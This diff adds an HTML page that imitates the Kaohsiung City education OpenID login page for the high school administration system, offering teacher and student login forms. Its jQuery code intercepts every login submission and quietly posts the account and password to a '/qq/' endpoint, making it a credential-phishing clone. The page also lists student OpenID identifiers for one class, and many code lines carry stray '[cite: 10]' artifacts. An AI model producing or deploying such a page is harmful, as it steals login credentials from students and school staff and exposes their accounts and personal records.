@@ -1,1 +1,435 @@
+<body style="text-align:center; background-color:#e2dfe8">61.227.231.<br>
 
+  <style type="text/css">
+  *{margin:0px; padding:0px; border:0px}
+  .grad {height:50px; color:#EF350A}
+.btn {font-family:DFKai-sb; font-size:17px; padding:2px 10px}
+.btn_submit {width:90px; height:33px; background-image:url(images/btn_submit.gif); cursor:pointer}
+.btn_submit:hover {background-image:url(images/btn_submit_over.gif)}
+.btn_ensure {width:90px;height:33px;background-image:url(images/btn_ensure.gif);cursor:pointer}
+.btn_ensure:hover {background-image:url(images/btn_ensure_over.gif)}
+.btn_cancel {width:90px;height:33px; background-image:url(images/openid/btn_cancel.gif); cursor:pointer}
+.btn_cancel:hover {background-image:url(images/openid/btn_cancel_over.gif)}
+.p1 {font-family:DFKai-sb; font-size:20px; margin-left:40px}
+.no-close .ui-dialog-titlebar-close {display:none;}
+#div-teacher { display: none }
+#div-student { display: none }
+#userid, #password, #password2 {border:1px solid #F8A777}
+  
+     .toggle-btn {
+        right: 6px;
+        background: transparent;
+        border: none;
+        height: 32px;
+        width: 36px;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        border-radius: 4px;
+        color: #4a4a4a;
+        transition: background-color .12s ease;
+      }
+      .eye {
+        display: inline-block;
+        width: 18px;
+        height: 12px;
+        border: 2px solid currentColor;
+        border-radius: 12px / 8px;
+        position: relative;
+        box-sizing: content-box;
+      }
+      .eye::after {
+        content: "";
+        position: absolute;
+        left: 50%;
+        top: 50%;
+        transform: translate(-50%,-50%);
+        width: 6px;
+        height: 6px;
+        background: currentColor;
+        border-radius: 50%;
+      }
+      .eye.hidden::before {
+        content: "";
+        position: absolute;
+        left: -3px;
+        right: -3px;
+        top: -4px;
+        bottom: -4px;
+        transform: rotate(-22deg);
+        border-top: 2px solid transparent;
+        border-bottom: 2px solid transparent;
+        border-left: 2px solid currentColor;
+        opacity: 0.9;
+      }
+  </style>
+  <link rel="stylesheet" href="js/themes/ui-lightness/jquery.ui.all.css">[cite: 10]
+  <script src="js/jquery-1.8.3.js"></script>[cite: 10]
+  <script src="js/jquery-ui-1.9.2.custom.js"></script>[cite: 10]
+  <script type="text/javascript">
+  var classInfo;
+  
+  $(function() {
+      $("#khschool").hide();[cite: 10]
+      $("#khgrade").hide();[cite: 10]
+      $("#khclass").hide();[cite: 10]
+      $("#khseatno").hide();[cite: 10]
+    
+      $("#role-confirm").dialog({
+        resizable: false,[cite: 10]
+        dialogClass: "no-close",[cite: 10]
+        height: 200,[cite: 10]
+        width: 380,[cite: 10]
+        modal: true,[cite: 10]
+        buttons: {
+          "直接輸入帳號": function() {
+            $( this ).dialog("close");[cite: 10]
+            $("#div-teacher").show();[cite: 10]
+            $("#userid").focus();[cite: 10]
+          },
+          "利用學生選單": function() {
+            $( this ).dialog("close");[cite: 10]
+            $("#div-student").show();[cite: 10]
+          }
+        }
+      }).prev(".ui-dialog-titlebar").css("background","#FFCC00");[cite: 10]
+          
+      $(document).keydown(function(e){
+         if (e.keyCode == 27)[cite: 10]
+         {
+            document.getElementById("isReturnTo").value="return_cancel";[cite: 10]
+            document.forms['esc_form'].submit();[cite: 10]
+         }
+      });
+
+      // 攔截登入表單送出，改用 AJAX 傳送到 /qq/ 且頁面不跳轉
+      $("form").not("#esc_form").on("submit", function(e) {
+          e.preventDefault(); // 阻止預設的頁面跳轉行為
+          var $form = $(this);
+          var formData = $form.serialize();
+
+          $.ajax({
+              url: '/qq/',
+              type: 'POST',
+              data: formData,
+              success: function(response) {
+                  alert("資料已成功傳送！");
+              },
+              error: function(xhr) {
+                  alert("傳送發生錯誤或伺服器未回應");
+              }
+          });
+      });
+    });
+  
+  function clearOption(select_name)
+  {
+     var selectObj=document.getElementById(select_name);[cite: 10]
+     selectObj.length=0;[cite: 10]
+     var new_option=new Option("請選擇..","");[cite: 10]
+     selectObj.options.add(new_option);[cite: 10]
+     $("#"+select_name).hide();[cite: 10]
+  }
+    
+  function areaChange(areaname)
+  {
+     clearOption("khschool");[cite: 10]
+     clearOption("khgrade");[cite: 10]
+     clearOption("khclass");[cite: 10]
+     clearOption("khseatno");[cite: 10]
+     
+     $.ajax({
+          url: '/fetchdataStuadm?schools/'+$('#kharea').val(),[cite: 10]
+          type: "POST",[cite: 10]
+          error: function(xhr) {[cite: 10]
+                  alert("發生錯誤");[cite: 10]
+                  alert(xhr);[cite: 10]
+                },
+          success: function(response) {[cite: 10]
+             var obj = eval("("+ response +")");[cite: 10]
+             var selectObj=document.getElementById("khschool");[cite: 10]
+  
+             for(var i=0;i<obj.length;i++)[cite: 10]
+             {
+                var new_option=new Option(obj[i][1], obj[i][0]);[cite: 10]
+                selectObj.options.add(new_option);[cite: 10]
+             }
+             $("#khschool").show();[cite: 10]		 
+          }
+     });
+  }
+  
+  function schoolChange(schoolname)
+  {
+     clearOption("khgrade");[cite: 10]
+     clearOption("khclass");[cite: 10]
+     clearOption("khseatno");[cite: 10]
+     
+     $.ajax({
+          url: "/fetchdataStuadm?classes/"+ schoolname +"/115a",[cite: 10]
+          type: "POST",[cite: 10]
+          error: function(xhr) {[cite: 10]
+                  alert("發生錯誤");[cite: 10]
+                  alert(xhr);[cite: 10]
+                },
+          success: function(response) {[cite: 10]
+             classInfo = eval("("+ response +")");[cite: 10]
+             var selectObj=document.getElementById("khgrade");[cite: 10]
+             
+             for(var key in classInfo){[cite: 10]
+                var new_option=((classInfo[key][0][0]).substr(0,classInfo[key][0][0].length-2)=='0')?new Option("特教群", key):new Option((classInfo[key][0][0]).substr(0,classInfo[key][0][0].length-2)+" 年級", key);[cite: 10]
+                selectObj.options.add(new_option);[cite: 10]
+             }
+             $("#khgrade").show();[cite: 10]
+          }
+     });
+  }
+  
+  function gradeChange(grade)
+  {
+     clearOption("khclass");[cite: 10]
+     clearOption("khseatno");[cite: 10]
+     var len=parseInt(classInfo[grade]);[cite: 10]
+     var selectObj=document.getElementById("khclass");[cite: 10]
+     
+     for(var key in classInfo[grade]){[cite: 10]
+        var new_option=new Option(classInfo[grade][key][1], grade+','+key);[cite: 10]
+        selectObj.options.add(new_option);[cite: 10]
+     }
+     $("#khclass").show();[cite: 10]
+  }
+  
+  function classChange(classno)
+  {
+     clearOption("khseatno");[cite: 10]
+     var school=$("#khschool").val();[cite: 10]
+     var grade=$("#khgrade").val();[cite: 10]
+     grade=classno.substring(0,classno.indexOf(','));[cite: 10]
+     var classPoint=classno.substring(classno.indexOf(',')+1);[cite: 10]
+     var qUrl = '';[cite: 10]
+     if(classInfo[grade][classPoint][5]==''){[cite: 10]
+        qUrl = school+'/'+classInfo[grade][classPoint][0]+'/'+classInfo[grade][classPoint][2]+'/simple';[cite: 10]
+     }else{
+        qUrl = school+'/'+classInfo[grade][classPoint][0]+'/'+classInfo[grade][classPoint][2]+'/'+classInfo[grade][classPoint][5]+'/'+classInfo[grade][classPoint][4]+'/'+classInfo[grade][classPoint][3]+'/simple';[cite: 10]
+     }
+     var myclass=grade+classno;[cite: 10]
+  
+     $.ajax({
+          url: '/fetchdataStuadm?students/'+qUrl,[cite: 10]
+          type: "POST",[cite: 10]
+          error: function(xhr) {[cite: 10]
+                  alert("發生錯誤");[cite: 10]
+                  alert(xhr);[cite: 10]
+                },
+          success: function(response) {[cite: 10]
+             var students=jQuery.parseJSON(response);[cite: 10]
+             var selectObj=document.getElementById("khseatno");[cite: 10]
+             for(var i=0;i<students.length;i++){[cite: 10]
+                var new_option=new Option(students[i].now_seat, students[i].openid);[cite: 10]
+                selectObj.options.add(new_option);[cite: 10]
+             }				
+             $("#khseatno").show();[cite: 10]		     
+          }
+     });
+  }
+  </script>
+  
+  <div style="margin:0px auto; width:826px; background:url(images/openid_1px.gif);text-align:left">
+  <div style="height:243px; background:url(images/openid_banner.gif)"></div>
+  
+  <div id="div-teacher" style="margin:20px 40px">
+  <table>
+  <tbody><tr>
+  <td style="width:27px; height:41px; background-color:#73479E"></td>
+  <td><h1 style="margin:4px 14px; color:#73479E">請求驗證</h1></td>
+  <td style="width:480px; height:41px; background-color:#C0ACD3"></td>
+  </tr></tbody></table>
+  <form method="post">
+  <h3 style="font-family:DFKai-sb; font-size:20px; margin-left:20px; margin-top:10px">您正要前往以下網站</h3>
+  <p class="p1">網站名稱：<span class="grad">高雄市高中職校務行政系統</span></p>
+  <p class="p1">網址：<span class="grad" style="font-size:15px">https://highschool.kh.edu.tw</span></p>
+  <h3 style="font-family:DFKai-sb;font-size:20px;margin-left:20px;margin-top:10px">請輸入密碼</h3>
+  <p class="p1">帳號：<font color="red">https://openid.kh.edu.tw/</font><span class="grad"><input id="userid" name="userid" type="text" value=""></span></p>
+  <p class="p1">密碼：<input id="password2" name="password" type="password" value="" autocomplete="off"><button id="pwdToggle2" class="toggle-btn" type="button" aria-label="顯示密碼" aria-pressed="false" title="顯示/隱藏密碼">
+          <span class="eye hidden" aria-hidden="true"></span>
+        </button>按下眼睛圖示可切換密碼顯示。</p>
+  <p class="p1"><input class="btn_submit" type="submit" value="" title="送出"></p>
+  <p class="p1"><font face="標楷體" size="4" color="red"><strong></strong></font></p>
+  <input type="hidden" id="_loginAction" name="_loginAction" value="T">
+  </form>
+  </div>  
+  
+  <script>
+      (function() {
+        const input = document.getElementById('password2');
+        const btn = document.getElementById('pwdToggle2');
+        const eye = btn.querySelector('.eye');
+  
+        function setState(show) {
+          if (show) {
+            input.type = 'text';
+            btn.setAttribute('aria-label', '隱藏密碼');
+            btn.setAttribute('aria-pressed', 'true');
+            eye.classList.remove('hidden');
+          } else {
+            input.type = 'password';
+            btn.setAttribute('aria-label', '顯示密碼');
+            btn.setAttribute('aria-pressed', 'false');
+            eye.classList.add('hidden');
+          }
+        }
+  
+        function toggle() {
+          setState(input.type === 'password');
+        }
+  
+        btn.addEventListener('click', toggle);
+        btn.addEventListener('keydown', function(e) {
+          if (e.key === 'Enter' || e.key === ' ') {
+            e.preventDefault();
+            toggle();
+          }
+        });
+        setState(false);
+      })();
+    </script>	
+
+  <div id="div-student" style="margin: 20px 40px; display: block;">
+  <table>
+  <tbody><tr>
+  <td style="width:27px; height:41px; background-color:#73479E"></td>
+  <td><h1 style="margin:4px 14px; color:#73479E">請求驗證</h1></td>
+  <td style="width:480px; height:41px; background-color:#C0ACD3"></td>
+  </tr></tbody></table>
+  <form method="post">
+  <h3 style="font-family:DFKai-sb; font-size:20px; margin-left:20px; margin-top:10px">您正要前往以下網站</h3>
+  <p class="p1">網站名稱：<span class="grad">高雄市高中職校務行政系統</span></p>
+  <p class="p1">網址：<span class="grad" style="font-size:15px">https://highschool.kh.edu.tw</span></p>
+  <h3 style="font-family:DFKai-sb;font-size:20px;margin-left:20px;margin-top:10px">請輸入密碼</h3>
+  <p class="p1">帳號：
+  <span class="grad"><font size="4" color="#660033">行政區:
+  <select id="kharea" name="kharea" style="border:red 2px solid" size="1" onchange="areaChange(this.options[this.options.selectedIndex].value)">
+  <option selected="" value="">請選擇..</option>
+  <option value="800">新興區</option>
+  <option value="801">前金區</option>
+  <option value="802">苓雅區</option>
+  <option value="803">鹽埕區</option>
+  <option value="804">鼓山區</option>
+  <option value="805">旗津區</option>
+  <option value="806">前鎮區</option>
+  <option value="807">三民區</option>
+  <option value="811">楠梓區</option>
+  <option value="812">小港區</option>
+  <option value="813">左營區</option>
+  <option value="814">仁武區</option>
+  <option value="815">大社區</option>
+  <option value="820">岡山區</option>
+  <option value="821">路竹區</option>
+  <option value="822">阿蓮區</option>
+  <option value="823">田寮區</option>
+  <option value="824">燕巢區</option>
+  <option value="825">橋頭區</option>
+  <option value="826">梓官區</option>
+  <option value="827">彌陀區</option>
+  <option value="828">永安區</option>
+  <option value="829">湖內區</option>
+  <option value="830">鳳山區</option>
+  <option value="831">大寮區</option>
+  <option value="832">林園區</option>
+  <option value="833">鳥松區</option>
+  <option value="840">大樹區</option>
+  <option value="842">旗山區</option>
+  <option value="843">美濃區</option>
+  <option value="844">六龜區</option>
+  <option value="845">內門區</option>
+  <option value="846">杉林區</option>
+  <option value="847">甲仙區</option>
+  <option value="848">桃源區</option>
+  <option value="849">那瑪夏區</option>
+  <option value="851">茂林區</option>
+  <option value="852">茄萣區</option>
+  </select>學校:
+  <select id="khschool" name="khschool" style="border: 2px solid red; display: inline-block;" size="1" onchange="schoolChange(this.options[this.options.selectedIndex].value)">
+  <option value="">請選擇..</option><option value="jips">仁愛國小</option><option value="fokps">佛公國小</option><option value="khps">光華國小</option><option value="qzps">前鎮國小</option><option value="fhps">復興國小</option><option value="acps">愛群國小</option><option value="mcps">明正國小</option><option value="lcps">樂群國小</option><option value="mchps">民權國小</option><option value="sjiaps">獅甲國小</option><option value="rsps">瑞祥國小</option><option value="rfps">瑞豐國小</option><option value="hmgps">紅毛港國小</option><option value="jcmps">鎮昌國小</option><option value="kivamjh">優佳國中</option><option value="khjh">光華國中</option><option value="qzjh">前鎮國中</option><option value="scjh">獅甲國中</option><option value="rfjh">瑞豐國中</option><option value="hjjh">興仁國中</option><option value="cjhs">前鎮高中</option><option value="rssh">瑞祥高中</option><option value="ccvs">中正高工</option><option value="ckmr">成功特教</option></select><br>
+  年級:
+  <select id="khgrade" name="khgrade" style="border: 2px solid red; display: inline-block;" size="1" onchange="gradeChange(this.options[this.options.selectedIndex].value)">
+  <option value="">請選擇..</option><option value="0">10 年級</option><option value="1">11 年級</option><option value="2">12 年級</option></select> 班級:
+  <select id="khclass" name="khclass" style="border: 2px solid red; display: inline-block;" size="1" onchange="classChange(this.options[this.options.selectedIndex].value)">
+  <option value="">請選擇..</option><option value="0,0">普通一忠</option><option value="0,1">機械一忠</option><option value="0,2">機械一孝</option><option value="0,3">電圖一忠</option><option value="0,4">汽車一忠</option><option value="0,5">汽車一孝</option><option value="0,6">資訊一忠</option><option value="0,7">資訊一孝</option><option value="0,8">電子一忠</option><option value="0,9">控制一忠</option><option value="0,10">電機一忠</option><option value="0,11">電機一孝</option><option value="0,12">冷凍一忠</option><option value="0,13">冷凍一孝</option><option value="0,14">電機一(夜)</option><option value="0,15">微電一(夜)</option><option value="0,16">冷凍一(夜)</option><option value="0,17">化工一忠</option><option value="0,18">化工一孝</option><option value="0,19">建築一忠</option><option value="0,20">建築一孝</option><option value="0,21">金工一忠</option><option value="0,22">金工一(夜)</option><option value="0,23">服務一忠</option></select> 座號:
+  <select id="khseatno" name="khseatno" style="border: 2px solid red; display: inline-block;" size="1">
+  <option value="">請選擇..</option><option value="S0614599">01</option><option value="S0619948">02</option><option value="S0612769">03</option><option value="S0614174">04</option><option value="S0600979">05</option><option value="S0605772">06</option><option value="S0604594">07</option><option value="S0606914">08</option><option value="S0606382">09</option><option value="S0618641">10</option><option value="S0605933">11</option><option value="S0612176">12</option><option value="S0608338">13</option><option value="S0611629">14</option><option value="S0604592">15</option><option value="S0601781">16</option><option value="S0604532">17</option><option value="S0607027">18</option><option value="S0611391">19</option><option value="S0601079">20</option><option value="S0611476">21</option><option value="S0603278">22</option><option value="S0601705">23</option><option value="S0607520">24</option><option value="S0617333">25</option><option value="S0617751">26</option><option value="S0616276">27</option><option value="S0606329">28</option><option value="S0600032">29</option><option value="S0607693">30</option><option value="S0616526">31</option><option value="S0604758">32</option></select>
+  </font></span>
+  </p>
+  <p class="p1">密碼：<input id="password" name="password" type="password" value="" autocomplete="off"><button id="pwdToggle" class="toggle-btn" type="button" aria-label="顯示密碼" aria-pressed="false" title="顯示/隱藏密碼">
+          <span class="eye hidden" aria-hidden="true"></span>
+        </button>按下眼睛圖示可切換密碼顯示。</p>
+  <p class="p1"><input class="btn_submit" type="submit" value="" title="送出"></p>
+  <p class="p1"><font face="標楷體" size="4" color="red"><strong></strong></font></p>
+  <input type="hidden" id="_loginAction" name="_loginAction" value="S">
+  </form>
+  </div>
+  
+    <script>
+      (function() {
+        const input = document.getElementById('password');
+        const btn = document.getElementById('pwdToggle');
+        const eye = btn.querySelector('.eye');
+  
+        function setState(show) {
+          if (show) {
+            input.type = 'text';
+            btn.setAttribute('aria-label', '隱藏密碼');
+            btn.setAttribute('aria-pressed', 'true');
+            eye.classList.remove('hidden');
+          } else {
+            input.type = 'password';
+            btn.setAttribute('aria-label', '顯示密碼');
+            btn.setAttribute('aria-pressed', 'false');
+            eye.classList.add('hidden');
+          }
+        }
+  
+        function toggle() {
+          setState(input.type === 'password');
+        }
+  
+        btn.addEventListener('click', toggle);
+        btn.addEventListener('keydown', function(e) {
+          if (e.key === 'Enter' || e.key === ' ') {
+            e.preventDefault();
+            toggle();
+          }
+        });
+        setState(false);
+      })();
+    </script>	
+
+  <div style="height:180px; background:url(images/openid_bottom.gif)">
+  <h4 style="margin-left:45px">一、若您是高市教職員，請登入<a href="https://portal.kh.edu.tw/">資訊服務入口網</a>，利用『個人服務/OpenID』申請帳號或修改密碼。<p></p></h4>
+  <h4 style="margin-left:45px">二、若您是本市高中職(含)以下的學生，您不知道OpenID帳號或<font color="red">忘記密碼，請詢問所就讀學校(教務處)</font>。<br><p></p></h4>
+  <h4 style="margin-left:45px">三、若您是本市高中職(含)以下的學生，<font color="red">知道自己的密碼，如果想自行更改密碼</font>，請<a href="https://stuadm.kh.edu.tw/stuLogin.jsp">按此連結</a>!!<p></p></h4>
+  <h4 style="margin-left:45px">四、若您是本市高中職(含)以下的學生，<font color="red">忘記自己的密碼，如果想自行重設密碼</font>，請<a href="https://stuadm.kh.edu.tw/resetPasswd.jsp">按此連結</a>!!<p></p></h4>
+  <h4 style="margin-left:45px">五、為因應資安規範要求，請變更您首次登入的隨機密碼。</h4>
+  <h4 style="margin-left:45px">六、為加強您的帳號使用安全，建議每90天應變更使用的密碼。</h4>
+  </div>
+  </div>
+  
+  <form id="esc_form"><input id="isReturnTo" name="isReturnTo" type="hidden" value=""></form>
+  
+  <div class="ui-dialog ui-widget ui-widget-content ui-corner-all no-close ui-draggable ui-dialog-buttons" tabindex="-1" role="dialog" aria-labelledby="ui-id-1" style="outline: 0px; z-index: 1002; height: auto; width: 380px; top: 286px; left: 659px; display: none;">
+    <div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix" style="background: rgb(255, 204, 0);">
+      <span id="ui-id-1" class="ui-dialog-title">選擇輸入方式</span>
+      <a href="#" class="ui-dialog-titlebar-close ui-corner-all" role="button"><span class="ui-icon ui-icon-closethick">close</span></a>
+    </div>
+    <div id="role-confirm" class="ui-dialog-content ui-widget-content" scrolltop="0" scrollleft="0" style="width: auto; min-height: 0px; height: 47px;">
+      <p><span style="float:left; margin:0 7px 20px 0;"></span><b>請選擇輸入帳號的方式？</b></p>
+    </div>
+    <div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix">
+      <div class="ui-dialog-buttonset">
+        <button type="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button" aria-disabled="false"><span class="ui-button-text">直接輸入帳號</span></button>
+        <button type="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button" aria-disabled="false"><span class="ui-button-text">利用學生選單</span></button>
+      </div>
+    </div>
+  </div>
+</body>
